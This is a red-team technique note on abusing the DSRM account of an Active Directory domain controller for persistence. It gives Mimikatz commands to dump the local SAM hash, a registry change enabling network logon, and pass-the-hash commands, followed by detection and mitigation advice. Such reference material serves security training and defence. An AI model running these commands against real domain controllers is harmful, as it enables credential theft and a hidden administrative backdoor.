---
title: DSRM
aliases: ["Directory Services Restore Mode", "DSRM persistence", "DSRM backdoor"]
type: technique
domain: [red-team, active-directory]
attack_tactic: [persistence]
tags: [type/technique, domain/red-team, attack/persistence]
source: "Microsoft documentation / community research"
source_url: "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-dsrm-password"
verified: true
related: ["[[Domain Controller (DC)]]", "[[SAM Database]]", "[[Pass-the-Hash]]", "[[Mimikatz]]"]
created: 2026-06-07
updated: 2026-06-07
---

# DSRM (Directory Services Restore Mode) Persistence

> [!summary] One-liner
> Abuse the DSRM local administrator account on a Domain Controller — it has its own password hash in the local SAM, and by changing a registry key, it can be used to authenticate over the network via pass-the-hash.

## Concept abused
Every [[Domain Controller (DC)]] has a **DSRM account** — a local administrator set during DC promotion, used for disaster recovery when booting into Directory Services Restore Mode. This account's password hash is stored in the DC's local [[SAM Database]] (separate from AD). By default, the DSRM account can only be used at the console during DSRM boot — but changing a single registry key enables **network logon**, allowing [[Pass-the-Hash]] with the DSRM hash.

## Prerequisites
- **Domain Admin / local admin on the DC** (to read the DSRM hash and modify the registry).
- Once set up, the persistence works without DA — the DSRM account is a local account.

## How the attack works
1. **Dump the DSRM password hash** from the DC's local SAM.
2. **Set the registry key** to allow network logon with the DSRM account.
3. **Pass-the-hash** with the DSRM account hash — you now have local admin on the DC, independent of domain credentials.

## Commands & tools

### Dump the DSRM hash
```
# Mimikatz (on the DC)
mimikatz # token::elevate
mimikatz # lsadump::sam
# Look for: User : Administrator  (RID 500 — this is the DSRM local admin)
# Hash NTLM : <DSRM_HASH>
```

### Enable network logon for DSRM
```cmd
# Set DsrmAdminLogonBehavior to 2 (allow network logon at any time)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

| Value | Behavior |
|---|---|
| 0 (default) | DSRM account can only log on in DSRM boot mode |
| 1 | DSRM account can log on when AD DS is stopped |
| **2** | DSRM account can log on **at any time** (network logon enabled) |

### Use the DSRM hash (pass-the-hash)
```bash
# Specify the DC hostname as the "domain" (it's a local account)
psexec.py -hashes :<DSRM_HASH> <DC_HOSTNAME>/Administrator@<DC_IP>

# Mimikatz
sekurlsa::pth /user:Administrator /domain:<DC_HOSTNAME> /ntlm:<DSRM_HASH> /run:cmd.exe
```

## Detection / artifacts
- **Registry monitoring**: Alert on changes to `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` (especially value 2).
- **Event 4624** (Logon): Local account logon (`Administrator` with the DC's local SAM, not the domain `Administrator`) — unusual on a DC.
- **Event 4657**: Registry value modification.
- Compare: domain `Administrator` SID (`S-1-5-21-<domain>-500`) vs. local DSRM `Administrator` SID (`S-1-5-21-<local>-500`).

## Mitigation
- **Regularly change the DSRM password**: `ntdsutil` → `set dsrm password` → `reset password on server <DC>`.
- **Monitor** the `DsrmAdminLogonBehavior` registry value — it should never be 2 in production.
- **Credential Guard**: Reduces exposure of cached hashes.
- Alert on local account logons to Domain Controllers.

## Related
- Target: [[Domain Controller (DC)]], [[SAM Database]] (local SAM on DC).
- Attack method: [[Pass-the-Hash]] (with the DSRM hash).
- Similar persistence: [[Skeleton Key]] (in-memory LSASS patch).
- Tool: [[Mimikatz]] (`lsadump::sam`).

## Sources
- Microsoft documentation — DSRM password management.
- AD security community research on DSRM persistence.
